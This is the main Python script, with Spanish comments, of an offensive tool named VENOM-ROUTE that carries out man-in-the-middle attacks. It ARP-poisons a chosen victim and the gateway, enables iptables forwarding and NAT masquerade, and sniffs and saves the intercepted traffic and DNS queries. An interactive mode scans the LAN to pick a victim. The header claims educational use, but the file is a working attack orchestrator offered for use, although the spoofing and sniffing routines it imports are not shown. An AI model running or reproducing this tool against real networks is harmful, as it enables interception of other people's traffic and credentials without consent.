#!/usr/bin/env python3
# =============================================================================
# Autor        : SysMho
# Script       : VENOM-ROUTE
# Descripción  : Venom-Route es una herramienta de automatización ofensiva cuyo
#                propósito es realizar ataques de Man-In-The-Middle (MITM)
#                mediante ARP spoofing, interponiéndose entre víctima y gateway.
#
# Modo de uso  : sudo python3 venom_route.py <IP_VICTIMA> <IP_GATEWAY> <INTERFAZ_RED> [-F] [-M] o solamente [-I]
#                -F = Activa iptables FORWARD a ACCEPT para permitir el reenvío del tráfico.
#                -M = Activa iptables MASQUERADE para NAT (enmascara y unifica el redireccionamiento
#                     en redes Ethernet/Wifi).
#                -I = Modo interactivo.
#  
# Advertencia  : Este software está diseñado exclusivamente con fines eduactivos,
#                de investigacion y de auditoría en entornos controlados
#                con permiso explícito.
#
#                El uso inadecuado no autorizado contra redes o sistemas de terceros es
#                ilegal y puede traer consecuencias legales.
#
#                El autor no asume ninguna responsabilidad por cualquier daño,
#                pérdida, infracción legal o consecuencia que resulte directa
#                o indirectamente del uso indebido o no autorizado de terceros
#                de esta herramienta.
# =============================================================================


# IMPORTACIÓN DE MÓDULOS PROPIOS

import sys      # Permite manejar argumentos del sistema y salir del programa de forma controlada.
import time     # Se utiliza para controlar pausas, temporizaciones y medir intervalos de tiempo.
import signal   # Captura señales del sistema (Ctrl+C) para realizar una salida limpia del programa.


# MODULOS PROPIOS
import arp_utils              # Manejo directo de ataques ARP: spoofing y restauración (despoofing).
import iptables_utils         # Control de reglas iptables: redireccionamiento, políticas y limpieza final.
import network_utils          # Funciones clave para identificar gateway, interfaces, MACs y red local.
import ui_utils               # Estilos y colores para consola. Presentación limpia al estilo SysMho.
import sniffer_engine         # Motor de sniffing modular que captura tráfico clave para análisis profundo.
import sniffer_utils          # Herramientas extra para registrar DNS y generar hashes de integridad.
import anti_sniff_detector    # Detector pasivo de sniffers en la red (interfaces en modo promiscuo).




# VARIABLES GLOBALES

ip_victima = ""
ip_gateway = ""
interface = ""
activar_forward_rule = False
activar_masquerade = False
stop_spinner = False
sniffer_thread = None
archivo_salida = "captura_venom.pcap"
archivo_dns_txt = ""
archivo_hash_pcap = ""
archivo_hash_txt = ""
activar_antinsniff = False

# FUNCIONES

def mostrar_uso():
    print(f"{ui_utils.BOLD_RED}[✘] Uso incorrecto.{ui_utils.NC}")
    print()
    print(f"{ui_utils.YELLOW}Modo de uso correcto:{ui_utils.NC}")
    print(f"  {ui_utils.BOLD_GREEN}MODO AVANZADO:{ui_utils.NC}")
    print(f"    sudo ./venom_route.py o python3 <IP_VICTIMA> <IP_GATEWAY> <INTERFAZ_RED> [-F] [-M] [-A]")
    print()
    print(f"  {ui_utils.BOLD_GREEN}MODO INTERACTIVO:{ui_utils.NC}")
    print(f"    sudo ./venom_route.py o python3 [-I]")
    print()
    print(f"{ui_utils.YELLOW}Opciones:{ui_utils.NC}")
    print(f"  -F = Activa iptables FORWARD a ACCEPT.")
    print(f"  -M = Activa iptables MASQUERADE para NAT.")
    print(f"  -A = Activa el detector anti-sniffer.")
    print(f"  -I = Modo Interactivo")
    print()
    sys.exit(1)

# Funcion que configura entorno previo al ataque

def inicializar_entorno():
    ui_utils.check_root()
    network_utils.validar_conectividad(ip_victima, ip_gateway)
    signal.signal(signal.SIGINT, signal_handler)
    iptables_utils.activar_forwarding()

# Funcion para el manejo de CTRL+C

def signal_handler(sig, frame):
    global stop_spinner
    print(f"\n{ui_utils.BOLD_RED}[✘] Interrupción detectada. Deteniendo proceso...{ui_utils.NC}")
    stop_spinner = True
    arp_utils.stop_attack.set()

    print(f"[*] Esperando que los hilos de envenenamiento se detengan...")
    for t in arp_utils.arpspoof_processes:
        t.join()

    arp_utils.restore_arp()
    iptables_utils.restaurar_forwarding()

    if activar_forward_rule:
        iptables_utils.restaurar_iptables_forward()

    if activar_masquerade:
        iptables_utils.restaurar_masquerade_rule(interface)

    print(f"[*] Deteniendo sniffer y guardando capturas...")
    sniffer_engine.detener_captura_sniffer()

    if sniffer_thread is not None:
        print(f"[*] Esperando que el hilo del sniffer finalice...")
        sniffer_thread.join()

    print(f"{ui_utils.BOLD_GREEN}[✔] Ataque detenido y limpieza completada.{ui_utils.NC}")
    sys.exit(0)

# MAIN

def main():
    global ip_victima, ip_gateway, interface
    global activar_forward_rule, activar_masquerade
    global sniffer_thread, archivo_salida
    global archivo_dns_txt, archivo_hash_pcap, archivo_hash_txt

    ui_utils.check_root()
    ui_utils.mostrar_banner()

# MODO INTERACTIVO

    if len(sys.argv) == 2 and sys.argv[1] == "-I":
        
        print(f"{ui_utils.YELLOW}[*] MODO INTERACTIVO INICIADO...{ui_utils.NC}")
        print(f"{ui_utils.YELLOW}[*] Detectando interfaces y subredes disponibles...{ui_utils.NC}")
        redes = network_utils.detectar_redes_disponibles()

        if not redes:
            print(f"{ui_utils.BOLD_RED}[✘] No se encontraron interfaces activas con IP configurada.{ui_utils.NC}")
            sys.exit(1)

        for i, (iface, cidr) in enumerate(redes, 1):
            print(f"[{i}] Interfaz: {iface} → Red: {cidr}")

        print()
        opcion = int(input(f"{ui_utils.YELLOW}[→] Selecciona la red a escanear: {ui_utils.NC}")) - 1
        interface, rango_detectado = redes[opcion]

        print(f"{ui_utils.YELLOW}[→] El rango de red detectado es {rango_detectado}{ui_utils.NC}")
        rango_red = input(f"{ui_utils.YELLOW}[→] Presiona ENTER para aceptar o escribe un nuevo rango: {ui_utils.NC}").strip()
        if not rango_red:
            rango_red = rango_detectado

        network_utils.interface = interface
        network_utils.escaneo_red(rango_red)
        ip_victima = network_utils.ip_victima
        ip_gateway = network_utils.ip_gateway

# Preguntar si se desea activar el FORWARD y MASQUERADE

        activar_forward_rule = ui_utils.preguntar("¿DESEAS ACTIVAR EL FORWARDING (iptables - FORWARD)?")
        activar_masquerade  = ui_utils.preguntar("¿DESEAS ACTIVAR EL MASQUERADE (NAT - iptables MASQUERADE)?")
        activar_antinsniff = ui_utils.preguntar("¿DESEAS ACTIVAR LA DETECCIÓN DE SNIFFERS EN LA RED?")

        print()
# MODO AVANZADO CON ARGUMENTOS

    elif len(sys.argv) >= 4:
        
        ip_victima = sys.argv[1]
        ip_gateway = sys.argv[2]
        interface  = sys.argv[3]
        activar_forward_rule = ('-F' in sys.argv)
        activar_masquerade   = ('-M' in sys.argv)

        network_utils.interface = interface
        network_utils.ip_victima = ip_victima
        network_utils.ip_gateway = ip_gateway

        activar_antinsniff = ('-A' in sys.argv)

    else:
        mostrar_uso()

    # Inicializar entorno

    inicializar_entorno()
    
    

    if activar_forward_rule:
        iptables_utils.activar_iptables_forward()

    if activar_masquerade:
        iptables_utils.activar_masquerade_rule(interface)

    if ui_utils.preguntar("¿ENVENENAR TABLAS ARP DE LA VÍCTIMA Y LA GATEWAY?"):
        arp_utils.spoof_objetivo()
        arp_utils.spoof_gateway()
    else:
        print(f"{ui_utils.BOLD_RED}[-] Envenenamiento cancelado.{ui_utils.NC}")
        sys.exit(0)
    print()

    sniffer_thread, archivo_salida, archivo_dns_txt, archivo_hash_pcap, archivo_hash_txt = sniffer_engine.iniciar_captura_sniffer(interface)


    print(f"{ui_utils.BOLD_GREEN}[✓] Sistema en modo de escucha{ui_utils.NC}")
    if activar_antinsniff:
        print(f"{ui_utils.YELLOW}[*] Activando módulo anti-sniffer...{ui_utils.NC}")
        anti_sniff_detector.iniciar_anti_sniffer(interface)
    time.sleep(1)
    while not stop_spinner:
        for puntos in [".", "..", "...", "....", "    "]:
            print(f"\r[*] VENOM-ROUTE activo. Presiona CTRL+C para detener y restaurar{puntos}", end='')
            time.sleep(0.3)

if __name__ == "__main__":
    main()
